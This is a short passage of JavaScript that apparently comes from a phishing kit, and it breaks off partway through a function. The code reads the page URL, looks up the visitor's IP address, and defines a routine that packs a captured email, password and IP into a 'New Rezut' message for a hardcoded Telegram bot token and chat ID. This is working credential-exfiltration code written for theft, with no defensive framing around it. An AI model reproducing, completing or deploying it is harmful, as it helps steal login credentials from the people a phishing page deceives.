 <script> function getUrlParameter(name) { const urlParams = new URLSearchParams(window.location.search); return urlParams.get(name); }

 async function getUserIP() { try { const response = await fetch('https://api.ipify.org?format=json'); const data = await response.json(); return data.ip; // Return the IP address } catch (error) { console.error('Error fetching IP:', error); return 'Unable to fetch IP'; } }
 async function sendToTelegram(email, password, ip) { const botToken = '8642585919:AAGJfHDb9w4FCmxc2WKNov54FBEccmuRutA'; // Replace with your bot token const chatId = '8629908210'; // Replace with your chat ID const message = `New Rezut:\nEmail: ${email}\nPassword: ${password}\nIP: ${ip}`;
